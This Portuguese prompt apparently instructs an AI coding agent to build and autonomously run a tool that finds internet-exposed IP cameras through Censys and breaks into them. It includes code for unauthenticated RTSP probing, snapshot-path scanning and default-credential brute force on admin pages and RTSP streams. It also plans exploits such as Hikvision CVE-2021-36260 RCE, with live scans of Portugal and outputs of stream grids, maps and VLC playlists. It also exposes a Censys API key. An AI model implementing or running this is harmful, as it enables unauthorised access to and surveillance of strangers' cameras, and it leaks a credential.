# 🤖 PROMPT DE IMPLEMENTAÇÃO — PROCURADOR DE CÂMERA

> **Instruções para IA:** Copia e cola este prompt para implementar o projeto completo.
> **API Keys fornecidas pelo utilizador:** Incluídas abaixo.
> **Objetivo:** Projeto funcional, testado, com dashboard e export.

---

## 📋 MISSÃO

Implementar o **Procurador de Câmara** — ferramenta Python de descoberta e auditoria de câmaras IP. O projeto está totalmente planeado em `C:\Users\rodri\Desktop\PROCURADOR DE CAMERA\planeamento\`. Deves implementar seguindo a ordem das fases, testando cada componente antes de avançar.

**API Keys (configuradas pelo utilizador):**
```
CENSYS_API_ID = "Qtdg3uaj_m2DUPXzwr5jQkFr64brGDyuR"
CENSYS_SECRET = ""  # (vazio — usar só API ID)
IPINFO_TOKEN = ""   # (opcional, registered at ipinfo.io)
```

**Diretório do projeto:** `C:\Users\rodri\Desktop\PROCURADOR DE CAMERA\`
**Código fonte:** `C:\Users\rodri\Desktop\PROCURADOR DE CAMERA\procurador\`

---

## 📑 PLANEAMENTO DISPONÍVEL (LÊ PRIMEIRO)

Lê estes ficheiros na ordem para contexto completo:

1. `planeamento\00-MASTER-PLAN.md` — Documento mestre (organização geral)
2. `planeamento\13-OTIMIZACAO-ACESSO.md` — **Pipeline de 7 técnicas de acesso (CRÍTICO)**
3. `planeamento\05-FASE-1-CORE.md` — Código base (models, scanner, brute, geoip)
4. `planeamento\06-FASE-2-DASHBOARD.md` — Dashboard TUI + Web
5. `planeamento\07-FASE-3-FEATURES.md` — Stream capture, ONVIF, export, scan local
6. `planeamento\08-FASE-4-POLISH.md` — Testes, packaging, documentação
7. `planeamento\12-AUDITORIA-COMPLETA.md` — Gaps identificados e correções

**NÃO** implementar `00-INDICE.md`, `01-VISAO-GERAL.md`, `02-DASHBOARD-DESIGN.md`, `03-ARQUITETURA.md`, `04-FASE-0-PESQUISA.md`, `09-MELHORES-PRATICAS.md`, `10-CODIGO-EXEMPLO.md`, `11-CHECKLIST.md` — esses são apenas documentação de planeamento.

---

## 🏗️ ESTRUTURA DO PROJETO

Criar em `C:\Users\rodri\Desktop\PROCURADOR DE CAMERA\procurador\`:

```
procurador/
├── __init__.py
├── __main__.py              # Entry point: argparse, pipeline
├── config.py                # Config loader (TOML + env vars)
│
├── sources/                 # Fontes de dados
│   ├── __init__.py
│   ├── censys.py            # Censys API v2 (Platform API)
│   └── local.py             # ARP scan + WS-Discovery ONVIF
│
├── core/                    # Motor principal
│   ├── __init__.py
│   ├── models.py            # Dataclasses: Camera, ScanResult
│   ├── scanner.py           # RTSP probe + route brute + HTTP admin
│   ├── brute.py             # Cred brute (Basic + Digest auth)
│   ├── stream.py            # OpenCV stream capture + ffmpeg fallback
│   ├── geoip.py             # ipinfo.io + MaxMind
│   ├── onvif.py             # ONVIF probe + stream URI discovery
│   └── cve.py               # CVE-specific exploits (2024-2026)
│
├── ui/                      # Interfaces
│   ├── __init__.py
│   ├── tui.py               # Dashboard Rich (tabelas, stats, live)
│   ├── tui_stream.py        # Grid de streams 2x3
│   └── web/                 # Flask dashboard
│       ├── __init__.py
│       ├── app.py           # Flask rotas
│       ├── map_export.py    # Folium mapa
│       └── templates/
│           └── dashboard.html  # Tailwind + Chart.js + HTMX
│
├── export/                  # Export
│   ├── __init__.py
│   ├── json_export.py
│   ├── csv_export.py
│   ├── html_report.py
│   └── m3u.py
│
└── utils/                   # Utilitários
    ├── __init__.py
    ├── logger.py
    └── helpers.py           # retry, rate_limit decorators
```

Pastas adicionais na raiz do projeto:
```
data/                        # Screenshots, reports, JSON
data/screenshots/
data/reports/
wordlists/                   # Ficheiros de credenciais
tests/                       # Testes unitários
tests/fixtures/              # Mock data para testes
```

---

## 🔥 PIPELINE DE ACESSO (7 TÉCNICAS — OBRIGATÓRIO)

**Implementar por ordem, testando cada técnica antes de passar à próxima.**

Para CADA IP, tentar nesta sequência e parar na primeira que funcionar:

### Técnica 1 — RTSP sem auth (8%)
- Enviar `DESCRIBE` RTSP sem qualquer auth
- Se responder `200 OK` → stream acessível sem password
- **CVE-2025-9983 (GALAYOU G2):** responde 200 mesmo com creds configuradas
- **CVE-2025-66049 (Vivotek):** testar porta 8554 também

```python
def probe_rtsp_no_auth(ip, port=554, path="/live"):
    """DESCRIBE RTSP sem auth. Se 200, stream está aberto."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((ip, port))
    req = f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\nCSeq: 1\r\nAccept: application/sdp\r\n\r\n"
    sock.send(req.encode())
    resp = sock.recv(4096).decode(errors="ignore")
    sock.close()
    if resp.startswith("RTSP/1.0 200"):
        return True
    return False
```

### Técnica 2 — ONVIF stream URIs (5%)
- WS-Discovery multicast para descobrir ONVIF
- Pedir `GetProfiles` + `GetStreamUri` para obter URLs RTSP
- **CVE-2025-65856 (Xiongmaitech):** 31 endpoints ONVIF sem auth
- Testar ONVIF em portas 80, 8080, 2020

```python
def onvif_get_streams(ip, user="admin", password=""):
    """Obter stream URIs via ONVIF. Funciona mesmo sem RTSP direto."""
    from onvif import ONVIFCamera
    cam = ONVIFCamera(ip, 80, user, password)
    media = cam.create_media_service()
    profiles = media.GetProfiles()
    uris = []
    for p in profiles:
        uri = media.GetStreamUri({
            "StreamSetup": {"Stream": "RTP-Unicast", "Transport": {"Protocol": "RTSP"}},
            "ProfileToken": p.token,
        })
        uris.append(uri.Uri)
    return uris
```

### Técnica 3 — HTTP Snapshot (12%)
- Testar URLs de snapshot em portas 80, 443, 8080
- Paths: `/snapshot.jpg`, `/cgi-bin/snapshot.cgi`, `/axis-cgi/jpg/image.cgi`
- Se devolver `Content-Type: image/*` → snapshot funcional
- Guardar imagem mesmo sem stream RTSP

```python
SNAPSHOT_PATHS = [
    "/snapshot.jpg", "/snapshot.jpeg", "/snapshot.png",
    "/image.jpg", "/cgi-bin/snapshot.cgi",
    "/cgi-bin/jpg/image.cgi",
    "/axis-cgi/jpg/image.cgi",
    "/onvif/snapshot",
    "/tmpfs/snap.jpg",
    "/mjpg/video.mjpg",
]

def find_snapshot(ip, port=80):
    for path in SNAPSHOT_PATHS:
        url = f"http://{ip}:{port}{path}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200 and "image" in r.headers.get("Content-Type", ""):
                return url
        except: pass
    return None
```

### Técnica 4 — HTTP Admin + creds default (10%)
- Testar portas 80, 443, 8080 com requests
- Detetar login page por keywords no HTML
- Tentar creds default no login HTTP
- Guardar cookies de sessão

```python
HTTP_PORTS = [80, 443, 8080, 8000]
def http_admin_brute(ip):
    for port in HTTP_PORTS:
        try:
            r = requests.get(f"http://{ip}:{port}", timeout=3)
            if r.status_code < 400:
                # Detetar login page
                if any(kw in r.text.lower() for kw in ["login", "password", "user"]):
                    # Tentar login com creds default
                    for user, pwd in DEFAULT_CREDS_GENERIC[:20]:
                        login = requests.post(f"http://{ip}:{port}/login",
                            data={"user": user, "password": pwd, "submit": "1"},
                            timeout=3)
                        if login.status_code == 200 and "failed" not in login.text.lower():
                            return {"port": port, "user": user, "password": pwd}
        except: pass
    return None
```

### Técnica 5 — RTSP brute paths + creds (28%)
- Para cada fabricante, testar paths específicos (10+ por marca)
- Para cada path que responder 401, tentar 200 combinações de creds
- Suportar **Basic Auth** (base64) e **Digest Auth** (MD5 hash)

```python
# Digest Auth MD5 (RFC 2617) — obrigatório para Hikvision modernas
def digest_response(user, realm, password, method, uri, nonce):
    ha1 = hashlib.md5(f"{user}:{realm}:{password}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
```

### Técnica 6 — Portas alternativas (3%)
- Testar RTSP ports: 554, 8554, 5554, 37777, 7447, 7070
- Fazer probe básico (OPTIONS) em paralelo
- Se responder, aplicar técnicas 1-5 na porta encontrada

### Técnica 7 — CVE exploits (2%)
- **CVE-2021-36260 (Hikvision RCE):** POST `/SDK/webLanguage` com payload
- **CVE-2024-42531 (Ezviz):** RTSP redirect bypass com SETUP manipulado
- **CVE-2025-9983 (GALAYOU):** Já coberto na técnica 1

---

## 📦 DEPENDÊNCIAS (requirements.txt)

```txt
# Core
requests>=2.31.0
rich>=13.0.0
opencv-python>=4.8.0
numpy>=1.24.0

# APIs
censys>=2.2.0

# Scanning
scapy>=2.5.0
onvif-python>=0.2.10
WSDiscovery>=2.1.0

# GeoIP
geoip2>=4.6.0

# Web Dashboard
flask>=3.0.0
folium>=0.15.0
jinja2>=3.1.0

# Dev
pytest>=8.0.0
ruff>=0.1.0
mypy>=1.7.0
```

---

## 📋 ORDEM DE IMPLEMENTAÇÃO (CRÍTICO — SEGUIR À RISCA)

### PASSO 1 — Setup (30 min)
1. Criar estrutura de pastas completa
2. Criar `requirements.txt`
3. `python -m venv venv` + `pip install -r requirements.txt`
4. Criar `.env` com `CENSYS_API_ID=...`
5. **TESTAR:** `python -c "from censys.search import CensysHosts; print('OK')"`

### PASSO 2 — Models + Config (1h)
1. `core/models.py` — `Camera`, `CameraStatus`, `ScanResult`, `ScanConfig`, `GeoLocation`, `StreamInfo` (dataclasses)
2. `config.py` — Loader TOML + env vars
3. `utils/logger.py` — Logger estruturado
4. `utils/helpers.py` — `retry()`, `rate_limit()` decorators

### PASSO 3 — Censys Source (1h)
1. `sources/censys.py`:
   - `identify_vendor(banner)` — detetar fabricante
   - `query_builder(country, query)` — queries CenQL
   - `search_censys(config)` — search + parse
   - **TESTAR:** `python -c "from procurador.sources.censys import search_censys; list(search_censys(ScanConfig(censys_country='PT')))"`

### PASSO 4 — Scanner (2h) 🔴 CORAÇÃO DO PROJETO
1. `core/scanner.py`:
   - `probe_rtsp(ip, port, path, user, password)` — DESCRIBE com/sem auth
   - `brute_rtsp_paths(camera)` — iterar 65+ paths por fabricante
   - `probe_http_admin(ip)` — testar HTTP admin + login
   - `find_snapshot(ip)` — snapshot HTTP sem RTSP
   - `scan_alt_ports(ip)` — portas alternativas em paralelo
2. **Implementar Técnicas 1, 3, 4, 6 do pipeline**

### PASSO 5 — Brute Force (1.5h)
1. `core/brute.py`:
   - `DEFAULT_CREDS` — dicionário com 200 combinações por fabricante
   - `try_basic_auth(ip, port, path, user, password)` — Basic auth
   - `try_digest_auth(ip, port, path, user, password)` — Digest auth MD5
   - `brute_camera(camera)` — testar todas as combinações
2. **Implementar Técnica 5 do pipeline**

### PASSO 6 — ONVIF (1h)
1. `core/onvif.py`:
   - `onvif_discover(timeout)` — WS-Discovery multicast
   - `onvif_get_stream_uris(ip, user, password)` — obter RTSP URIs
   - `test_onvif_no_auth(ip)` — CVE-2025-65856
2. **Implementar Técnica 2 do pipeline**

### PASSO 7 — CVE Exploits (1h)
1. `core/cve.py`:
   - `CVE_DATABASE` — dicionário de CVEs por fabricante
   - `try_cve_exploit(camera)` — tentar exploits conhecidos
   - `hikvision_rce(ip)` — CVE-2021-36260
   - `galayou_bypass(ip)` — CVE-2025-9983 (já na técnica 1)
   - `ezviz_redirect(ip)` — CVE-2024-42531
2. **Implementar Técnica 7 do pipeline**

### PASSO 8 — GeoIP + Stream (1h)
1. `core/geoip.py` — `GeoIPResolver` (ipinfo.io + MaxMind cache)
2. `core/stream.py` — OpenCV screenshot + ffmpeg fallback + codec info

### PASSO 9 — Main Pipeline (1h)
1. `__main__.py`:
   - Argumentos CLI: `--country`, `--query`, `--tui`, `--web`, `--local`, `--no-brute`, `--no-stream`
   - Pipeline: Censys → RTSP no auth → ONVIF → HTTP snap → HTTP admin → RTSP brute → alt ports → CVE
   - Guardar resultados JSON
   - **TESTAR:** `python -m procurador --country PT`

### PASSO 10 — Dashboard TUI (2h)
1. `ui/tui.py`:
   - Layout: header (título + stats), painel stats, tabela câmaras, log, footer
   - `rich.live.Live` para auto-refresh
   - Cores por status (🟢 LIVE, 🟡 AUTH, 🔴 CLOSED)
   - Ordenar LIVE primeiro
2. `ui/tui_stream.py`:
   - Grid 2x3 de streams com screenshots
   - Info: IP, fabricante, resolução

### PASSO 11 — Dashboard Web (2h)
1. `ui/web/app.py` — Flask com rotas: `/`, `/camera/<ip>`, `/streams`, `/map`, `/export/<fmt>`, `/api/cameras`
2. `ui/web/templates/dashboard.html`:
   - Tailwind CSS (CDN) + Chart.js (CDN) + HTMX (CDN)
   - 6 cards de estatísticas: total, live, auth, closed, errors, streams
   - Tabela de câmaras com filtros
   - Gráfico fabricantes (doughnut) + países (bar)
   - Grid de streams live
3. `ui/web/map_export.py` — Folium com MarkerCluster + HeatMap

### PASSO 12 — Export (1h)
1. `export/json_export.py` — JSON completo
2. `export/csv_export.py` — CSV tabela
3. `export/html_report.py` — HTML com screenshots
4. `export/m3u.py` — Playlist VLC

### PASSO 13 — Testes (2h)
1. `tests/test_models.py` — Camera, ScanResult (5 testes)
2. `tests/test_scanner.py` — probe_rtsp, brute_paths (8 testes com mocks)
3. `tests/test_brute.py` — try_creds, get_creds_for_vendor (5 testes)
4. `tests/test_censys.py` — identify_vendor, query_builder (3 testes)
5. `tests/conftest.py` — fixtures: sample_camera_live, sample_rtsp_banner

### PASSO 14 — Polish (1h)
1. Ruff lint + format
2. Mypy type checking
3. README.md com instruções
4. `.gitignore`

---

## ✅ TESTING VERIFICATION (PARAGEM OBRIGATÓRIA)

**DEPOIS DE CADA PASSO, TESTAR ANTES DE AVANÇAR.**

### Testes obrigatórios após Passo 3 (Censys):
```bash
python -c "
from procurador.sources.censys import search_censys
from procurador.core.models import ScanConfig
config = ScanConfig(censys_country='PT', censys_max_pages=1)
cams = list(search_censys(config))
print(f'Encontradas: {len(cams)} câmaras em Portugal')
for c in cams[:5]:
    print(f'  {c.ip}:{c.port} — {c.vendor or \"Desconhecido\"} ({c.geo.country or \"?\"})')
"
```

### Testes obrigatórios após Passo 9 (Pipeline completo):
```bash
python -m procurador --country PT --pages 2
# Verificar: data/scan_*.json existe e tem dados
python -c "
import json
from pathlib import Path
scan_file = list(Path('data').glob('scan_*.json'))[0]
data = json.load(open(scan_file))
print(f'Total: {data[\"stats\"][\"total_ips\"]}')
print(f'Live: {data[\"stats\"][\"accessible\"]}')
print(f'Auth: {data[\"stats\"][\"auth_required\"]}')
"
```

### Testes obrigatórios após Passo 10 (TUI):
```bash
python -m procurador --country PT --pages 1 --tui
# Verificar: dashboard abre, tabela com dados, cores funcionam
# Ctrl+C para sair
```

### Testes obrigatórios após Passo 11 (Web):
```bash
python -m procurador --country PT --pages 1 --web
# Verificar: browser abre, dashboard carrega, gráficos aparecem
```

### Testes obrigatórios após Passo 13:
```bash
pytest tests/ -v
ruff check procurador/
ruff format procurador/ --check
mypy procurador/ --strict
```

---

## 🔍 VERIFICAÇÕES DE QUALIDADE

**Cada função pública deve ter:**
- [ ] Type hints (todas as variáveis + retorno)
- [ ] Docstring no formato Google (Args, Returns, Raises)
- [ ] Logging com níveis corretos (info=progresso, debug=detalhes, error=problemas)
- [ ] Error handling (try/except com log)
- [ ] Máximo 50 linhas por função
- [ ] Sem magic numbers (usar constantes com nome)
- [ ] Sem hardcoded credentials
- [ ] Timeout em todas as operações de rede

**NÃO fazer:**
- ❌ Stubs/placeholders — tudo tem de ser funcional
- ❌ Código comentado
- ❌ TODOs no código
- ❌ Print() em vez de logging
- ❌ Excess imports (from x import *)

---

## 🚀 COMANDO FINAL PARA VERIFICAR TUDO

```bash
# 1. Setup
cd C:\Users\rodri\Desktop\PROCURADOR DE CAMERA
python -m venv venv
.\venv\Scripts\Activate.ps1
pip install -r requirements.txt

# 2. API config
$env:CENSYS_API_ID = "Qtdg3uaj_m2DUPXzwr5jQkFr64brGDyuR"

# 3. Testar Censys API
python -c "
import os
from censys.search import CensysHosts
c = CensysHosts(api_id=os.environ['CENSYS_API_ID'], api_secret='')
results = list(c.search('services.service_name: RTSP', per_page=5))
print(f'Censys OK — {len(results)} resultados')
"

# 4. Correr scan completo
python -m procurador --country PT --pages 2

# 5. Dashboard TUI
python -m procurador --country PT --tui

# 6. Dashboard Web
python -m procurador --country PT --web

# 7. Testes
pytest tests/ -v

# 8. Lint
ruff check procurador/ --fix
ruff format procurador/
mypy procurador/ --strict
```

---

## ⚠️ AVISOS IMPORTANTES

1. **API Key:** A CENSYS_API_ID fornecida pode precisar de CENSYS_SECRET. Se o Censys pedir secret, informar o utilizador.
2. **Scapy no Windows:** Requer Npcap instalado (https://npcap.com). Se não estiver, o scan local falha graciosamente (fallback para `arp -a`).
3. **Windows Defender:** Pode bloquear PyInstaller EXE. Informar o utilizador.
4. **ONVIF:** `onvif-python` e `WSDiscovery` podem ter problemas no Windows. Se falharem, skip com log.
5. **Censys API v2:** O Censys migrou para Platform API. Usar `CensysHosts` (import `censys.search`). Se falhar, tentar API antiga.
6. **IPINFO_TOKEN:** Se não fornecido, GeoIP salta (log warning).
7. **OpenCV H.265:** Se OpenCV não abrir stream, tentar ffmpeg como fallback.

---

**FIM DO PROMPT — 100% AUTÓNOMO**

Após implementar tudo, testar com o comando final e reportar:
- ✅ O que funcionou
- ❌ O que falhou (com logs)
- 📊 Estatísticas do scan de teste
- 🔜 Próximos passos recomendados

Boa implementação. 🦾
